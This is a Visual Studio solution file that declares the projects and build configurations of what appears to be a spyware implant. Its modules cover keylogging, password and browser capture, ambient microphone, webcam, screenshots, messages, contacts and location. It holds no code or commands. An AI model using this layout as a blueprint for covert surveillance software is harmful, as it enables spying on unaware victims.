
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31727.386
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "H4DLL", "H4DLL\H4DLL.vcxproj", "{B149B0CB-E46F-4CFF-B937-BFAF18860B66}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "H64DLL", "H64DLL\H64DLL.vcxproj", "{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "include", "include\include.vcxitems", "{E688D7B2-266D-49C2-88E7-81C862F3186E}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "libs", "libs", "{5A389EED-A6F2-4BCB-9441-6CF64BA29E45}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "json", "libs\json\json.vcxproj", "{6441D909-EEED-402B-BE33-D8E5065B28A6}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "crypto", "libs\crypto\crypto.vcxproj", "{C648D3E2-2CCE-465D-8CDB-06DC173F5330}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "modules", "modules", "{BD8E2131-356F-43B1-B256-9C693FBAF009}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "clipboard", "modules\clipboard\clipboard.vcxproj", "{C152F670-F985-479A-BA26-8667B1B7525F}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "browser", "modules\browser\browser.vcxproj", "{0847EE46-6973-4B47-9213-A5D08598CCD1}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "pwdagent", "modules\pwdagent\pwdagent.vcxproj", "{78FD7A30-5490-4423-9E72-D487CE567699}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "base64", "libs\base64\base64.vcxproj", "{D30332C5-F395-42F4-B0B6-2700E3A6096A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "imagent", "modules\imagent\imagent.vcxproj", "{F62DC66B-F072-443C-8735-8C67176F3059}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "social", "modules\social\social.vcxproj", "{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "pdagent", "modules\pdagent\pdagent.vcxproj", "{3CF14307-C042-4864-9DEA-1A510D634148}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "rcs", "libs\rcs\rcs.vcxproj", "{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ambmic", "modules\ambmic\ambmic.vcxproj", "{03E0654B-BBA4-4892-A59F-777901AF8239}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "money", "modules\money\money.vcxproj", "{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "messages", "modules\messages\messages.vcxproj", "{C25436F4-11DE-497D-A9D9-D9473C328615}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "contacts", "modules\contacts\contacts.vcxproj", "{32712842-2AAD-4642-9947-D3D821B58A97}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "printpool", "modules\printpool\printpool.vcxproj", "{AD27E374-9FC5-4CF9-B877-34E7F57AB851}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "application", "modules\application\application.vcxproj", "{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "keylog", "modules\keylog\keylog.vcxproj", "{A1543B1A-6D3E-471F-8BE1-176514E621D8}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "crisis", "modules\crisis\crisis.vcxproj", "{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "screenshot", "modules\screenshot\screenshot.vcxproj", "{B8D1620F-9762-4D49-B09B-4496D4D01F26}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "device", "modules\device\device.vcxproj", "{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "webcam", "modules\webcam\webcam.vcxproj", "{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "urlwin32", "modules\urlwin32\urlwin32.vcxproj", "{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "location", "modules\location\location.vcxproj", "{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Debug|x64.ActiveCfg = Debug|Win32
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Debug|x86.ActiveCfg = Debug|Win32
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Debug|x86.Build.0 = Debug|Win32
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Release|x64.ActiveCfg = Release|Win32
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Release|x86.ActiveCfg = Release|Win32
		{B149B0CB-E46F-4CFF-B937-BFAF18860B66}.Release|x86.Build.0 = Release|Win32
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Debug|x64.ActiveCfg = Debug|x64
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Debug|x64.Build.0 = Debug|x64
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Debug|x86.ActiveCfg = Debug|Win32
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Debug|x86.Build.0 = Debug|Win32
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Release|x64.ActiveCfg = Release|x64
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Release|x64.Build.0 = Release|x64
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Release|x86.ActiveCfg = Release|Win32
		{BF754BDC-9319-4E73-8F6E-BC2DB0897EFD}.Release|x86.Build.0 = Release|Win32
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Debug|x64.ActiveCfg = Debug|x64
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Debug|x64.Build.0 = Debug|x64
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Debug|x86.ActiveCfg = Debug|Win32
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Debug|x86.Build.0 = Debug|Win32
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Release|x64.ActiveCfg = Release|x64
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Release|x64.Build.0 = Release|x64
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Release|x86.ActiveCfg = Release|Win32
		{6441D909-EEED-402B-BE33-D8E5065B28A6}.Release|x86.Build.0 = Release|Win32
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Debug|x64.ActiveCfg = Debug|x64
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Debug|x64.Build.0 = Debug|x64
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Debug|x86.ActiveCfg = Debug|Win32
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Debug|x86.Build.0 = Debug|Win32
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Release|x64.ActiveCfg = Release|x64
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Release|x64.Build.0 = Release|x64
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Release|x86.ActiveCfg = Release|Win32
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330}.Release|x86.Build.0 = Release|Win32
		{C152F670-F985-479A-BA26-8667B1B7525F}.Debug|x64.ActiveCfg = Debug|x64
		{C152F670-F985-479A-BA26-8667B1B7525F}.Debug|x64.Build.0 = Debug|x64
		{C152F670-F985-479A-BA26-8667B1B7525F}.Debug|x86.ActiveCfg = Debug|Win32
		{C152F670-F985-479A-BA26-8667B1B7525F}.Debug|x86.Build.0 = Debug|Win32
		{C152F670-F985-479A-BA26-8667B1B7525F}.Release|x64.ActiveCfg = Release|x64
		{C152F670-F985-479A-BA26-8667B1B7525F}.Release|x64.Build.0 = Release|x64
		{C152F670-F985-479A-BA26-8667B1B7525F}.Release|x86.ActiveCfg = Release|Win32
		{C152F670-F985-479A-BA26-8667B1B7525F}.Release|x86.Build.0 = Release|Win32
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Debug|x64.ActiveCfg = Debug|x64
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Debug|x64.Build.0 = Debug|x64
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Debug|x86.ActiveCfg = Debug|Win32
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Debug|x86.Build.0 = Debug|Win32
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Release|x64.ActiveCfg = Release|x64
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Release|x64.Build.0 = Release|x64
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Release|x86.ActiveCfg = Release|Win32
		{0847EE46-6973-4B47-9213-A5D08598CCD1}.Release|x86.Build.0 = Release|Win32
		{78FD7A30-5490-4423-9E72-D487CE567699}.Debug|x64.ActiveCfg = Debug|x64
		{78FD7A30-5490-4423-9E72-D487CE567699}.Debug|x64.Build.0 = Debug|x64
		{78FD7A30-5490-4423-9E72-D487CE567699}.Debug|x86.ActiveCfg = Debug|Win32
		{78FD7A30-5490-4423-9E72-D487CE567699}.Debug|x86.Build.0 = Debug|Win32
		{78FD7A30-5490-4423-9E72-D487CE567699}.Release|x64.ActiveCfg = Release|x64
		{78FD7A30-5490-4423-9E72-D487CE567699}.Release|x64.Build.0 = Release|x64
		{78FD7A30-5490-4423-9E72-D487CE567699}.Release|x86.ActiveCfg = Release|Win32
		{78FD7A30-5490-4423-9E72-D487CE567699}.Release|x86.Build.0 = Release|Win32
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Debug|x64.ActiveCfg = Debug|x64
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Debug|x64.Build.0 = Debug|x64
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Debug|x86.ActiveCfg = Debug|Win32
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Debug|x86.Build.0 = Debug|Win32
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Release|x64.ActiveCfg = Release|x64
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Release|x64.Build.0 = Release|x64
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Release|x86.ActiveCfg = Release|Win32
		{D30332C5-F395-42F4-B0B6-2700E3A6096A}.Release|x86.Build.0 = Release|Win32
		{F62DC66B-F072-443C-8735-8C67176F3059}.Debug|x64.ActiveCfg = Debug|x64
		{F62DC66B-F072-443C-8735-8C67176F3059}.Debug|x64.Build.0 = Debug|x64
		{F62DC66B-F072-443C-8735-8C67176F3059}.Debug|x86.ActiveCfg = Debug|Win32
		{F62DC66B-F072-443C-8735-8C67176F3059}.Debug|x86.Build.0 = Debug|Win32
		{F62DC66B-F072-443C-8735-8C67176F3059}.Release|x64.ActiveCfg = Release|x64
		{F62DC66B-F072-443C-8735-8C67176F3059}.Release|x64.Build.0 = Release|x64
		{F62DC66B-F072-443C-8735-8C67176F3059}.Release|x86.ActiveCfg = Release|Win32
		{F62DC66B-F072-443C-8735-8C67176F3059}.Release|x86.Build.0 = Release|Win32
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Debug|x64.ActiveCfg = Debug|x64
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Debug|x64.Build.0 = Debug|x64
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Debug|x86.ActiveCfg = Debug|Win32
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Debug|x86.Build.0 = Debug|Win32
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Release|x64.ActiveCfg = Release|x64
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Release|x64.Build.0 = Release|x64
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Release|x86.ActiveCfg = Release|Win32
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC}.Release|x86.Build.0 = Release|Win32
		{3CF14307-C042-4864-9DEA-1A510D634148}.Debug|x64.ActiveCfg = Debug|x64
		{3CF14307-C042-4864-9DEA-1A510D634148}.Debug|x64.Build.0 = Debug|x64
		{3CF14307-C042-4864-9DEA-1A510D634148}.Debug|x86.ActiveCfg = Debug|Win32
		{3CF14307-C042-4864-9DEA-1A510D634148}.Debug|x86.Build.0 = Debug|Win32
		{3CF14307-C042-4864-9DEA-1A510D634148}.Release|x64.ActiveCfg = Release|x64
		{3CF14307-C042-4864-9DEA-1A510D634148}.Release|x64.Build.0 = Release|x64
		{3CF14307-C042-4864-9DEA-1A510D634148}.Release|x86.ActiveCfg = Release|Win32
		{3CF14307-C042-4864-9DEA-1A510D634148}.Release|x86.Build.0 = Release|Win32
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Debug|x64.ActiveCfg = Debug|x64
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Debug|x64.Build.0 = Debug|x64
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Debug|x86.ActiveCfg = Debug|Win32
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Debug|x86.Build.0 = Debug|Win32
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Release|x64.ActiveCfg = Release|x64
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Release|x64.Build.0 = Release|x64
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Release|x86.ActiveCfg = Release|Win32
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A}.Release|x86.Build.0 = Release|Win32
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Debug|x64.ActiveCfg = Debug|x64
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Debug|x64.Build.0 = Debug|x64
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Debug|x86.ActiveCfg = Debug|Win32
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Debug|x86.Build.0 = Debug|Win32
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Release|x64.ActiveCfg = Release|x64
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Release|x64.Build.0 = Release|x64
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Release|x86.ActiveCfg = Release|Win32
		{03E0654B-BBA4-4892-A59F-777901AF8239}.Release|x86.Build.0 = Release|Win32
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Debug|x64.ActiveCfg = Debug|x64
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Debug|x64.Build.0 = Debug|x64
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Debug|x86.ActiveCfg = Debug|Win32
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Debug|x86.Build.0 = Debug|Win32
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Release|x64.ActiveCfg = Release|x64
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Release|x64.Build.0 = Release|x64
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Release|x86.ActiveCfg = Release|Win32
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6}.Release|x86.Build.0 = Release|Win32
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Debug|x64.ActiveCfg = Debug|x64
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Debug|x64.Build.0 = Debug|x64
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Debug|x86.ActiveCfg = Debug|Win32
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Debug|x86.Build.0 = Debug|Win32
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Release|x64.ActiveCfg = Release|x64
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Release|x64.Build.0 = Release|x64
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Release|x86.ActiveCfg = Release|Win32
		{C25436F4-11DE-497D-A9D9-D9473C328615}.Release|x86.Build.0 = Release|Win32
		{32712842-2AAD-4642-9947-D3D821B58A97}.Debug|x64.ActiveCfg = Debug|x64
		{32712842-2AAD-4642-9947-D3D821B58A97}.Debug|x64.Build.0 = Debug|x64
		{32712842-2AAD-4642-9947-D3D821B58A97}.Debug|x86.ActiveCfg = Debug|Win32
		{32712842-2AAD-4642-9947-D3D821B58A97}.Debug|x86.Build.0 = Debug|Win32
		{32712842-2AAD-4642-9947-D3D821B58A97}.Release|x64.ActiveCfg = Release|x64
		{32712842-2AAD-4642-9947-D3D821B58A97}.Release|x64.Build.0 = Release|x64
		{32712842-2AAD-4642-9947-D3D821B58A97}.Release|x86.ActiveCfg = Release|Win32
		{32712842-2AAD-4642-9947-D3D821B58A97}.Release|x86.Build.0 = Release|Win32
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Debug|x64.ActiveCfg = Debug|x64
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Debug|x64.Build.0 = Debug|x64
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Debug|x86.ActiveCfg = Debug|Win32
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Debug|x86.Build.0 = Debug|Win32
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Release|x64.ActiveCfg = Release|x64
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Release|x64.Build.0 = Release|x64
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Release|x86.ActiveCfg = Release|Win32
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851}.Release|x86.Build.0 = Release|Win32
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Debug|x64.ActiveCfg = Debug|x64
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Debug|x64.Build.0 = Debug|x64
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Debug|x86.ActiveCfg = Debug|Win32
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Debug|x86.Build.0 = Debug|Win32
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Release|x64.ActiveCfg = Release|x64
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Release|x64.Build.0 = Release|x64
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Release|x86.ActiveCfg = Release|Win32
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6}.Release|x86.Build.0 = Release|Win32
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Debug|x64.ActiveCfg = Debug|x64
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Debug|x64.Build.0 = Debug|x64
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Debug|x86.ActiveCfg = Debug|Win32
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Debug|x86.Build.0 = Debug|Win32
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Release|x64.ActiveCfg = Release|x64
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Release|x64.Build.0 = Release|x64
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Release|x86.ActiveCfg = Release|Win32
		{A1543B1A-6D3E-471F-8BE1-176514E621D8}.Release|x86.Build.0 = Release|Win32
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Debug|x64.ActiveCfg = Debug|x64
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Debug|x64.Build.0 = Debug|x64
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Debug|x86.ActiveCfg = Debug|Win32
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Debug|x86.Build.0 = Debug|Win32
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Release|x64.ActiveCfg = Release|x64
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Release|x64.Build.0 = Release|x64
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Release|x86.ActiveCfg = Release|Win32
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC}.Release|x86.Build.0 = Release|Win32
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Debug|x64.ActiveCfg = Debug|x64
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Debug|x64.Build.0 = Debug|x64
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Debug|x86.ActiveCfg = Debug|Win32
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Debug|x86.Build.0 = Debug|Win32
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Release|x64.ActiveCfg = Release|x64
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Release|x64.Build.0 = Release|x64
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Release|x86.ActiveCfg = Release|Win32
		{B8D1620F-9762-4D49-B09B-4496D4D01F26}.Release|x86.Build.0 = Release|Win32
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Debug|x64.ActiveCfg = Debug|x64
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Debug|x64.Build.0 = Debug|x64
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Debug|x86.ActiveCfg = Debug|Win32
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Debug|x86.Build.0 = Debug|Win32
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Release|x64.ActiveCfg = Release|x64
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Release|x64.Build.0 = Release|x64
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Release|x86.ActiveCfg = Release|Win32
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB}.Release|x86.Build.0 = Release|Win32
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Debug|x64.ActiveCfg = Debug|x64
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Debug|x64.Build.0 = Debug|x64
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Debug|x86.ActiveCfg = Debug|Win32
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Debug|x86.Build.0 = Debug|Win32
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Release|x64.ActiveCfg = Release|x64
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Release|x64.Build.0 = Release|x64
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Release|x86.ActiveCfg = Release|Win32
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F}.Release|x86.Build.0 = Release|Win32
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Debug|x64.ActiveCfg = Debug|x64
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Debug|x64.Build.0 = Debug|x64
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Debug|x86.ActiveCfg = Debug|Win32
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Debug|x86.Build.0 = Debug|Win32
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Release|x64.ActiveCfg = Release|x64
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Release|x64.Build.0 = Release|x64
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Release|x86.ActiveCfg = Release|Win32
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960}.Release|x86.Build.0 = Release|Win32
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Debug|x64.ActiveCfg = Debug|x64
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Debug|x64.Build.0 = Debug|x64
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Debug|x86.ActiveCfg = Debug|Win32
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Debug|x86.Build.0 = Debug|Win32
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Release|x64.ActiveCfg = Release|x64
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Release|x64.Build.0 = Release|x64
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Release|x86.ActiveCfg = Release|Win32
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{6441D909-EEED-402B-BE33-D8E5065B28A6} = {5A389EED-A6F2-4BCB-9441-6CF64BA29E45}
		{C648D3E2-2CCE-465D-8CDB-06DC173F5330} = {5A389EED-A6F2-4BCB-9441-6CF64BA29E45}
		{C152F670-F985-479A-BA26-8667B1B7525F} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{0847EE46-6973-4B47-9213-A5D08598CCD1} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{78FD7A30-5490-4423-9E72-D487CE567699} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{D30332C5-F395-42F4-B0B6-2700E3A6096A} = {5A389EED-A6F2-4BCB-9441-6CF64BA29E45}
		{F62DC66B-F072-443C-8735-8C67176F3059} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{6288DE9F-1304-44CE-8DA9-C411CE65E5BC} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{3CF14307-C042-4864-9DEA-1A510D634148} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{EC1A5C07-53B5-44C9-B574-FDE3FCA3F28A} = {5A389EED-A6F2-4BCB-9441-6CF64BA29E45}
		{03E0654B-BBA4-4892-A59F-777901AF8239} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{B442ABEC-9CB1-4091-9F78-7673C1B0B1D6} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{C25436F4-11DE-497D-A9D9-D9473C328615} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{32712842-2AAD-4642-9947-D3D821B58A97} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{AD27E374-9FC5-4CF9-B877-34E7F57AB851} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{E1B8DB95-C840-4796-A94F-FDE8EE876CF6} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{A1543B1A-6D3E-471F-8BE1-176514E621D8} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{592A7501-9AF3-4C9E-BCFC-763DAE3AC1BC} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{B8D1620F-9762-4D49-B09B-4496D4D01F26} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{45DD02B2-02DA-43C1-AD4F-7E655E242EEB} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{83902D0C-9FF0-443F-BC89-D2BBDA75B93F} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{BF23CEAC-FD3F-4725-8D4B-E4D2A3CB7960} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
		{DBE20AC8-80B6-400E-94E4-F2ABFC7E4568} = {BD8E2131-356F-43B1-B256-9C693FBAF009}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {6D1E06D9-37BC-4A13-8F1B-0E249F80B002}
	EndGlobalSection
EndGlobal
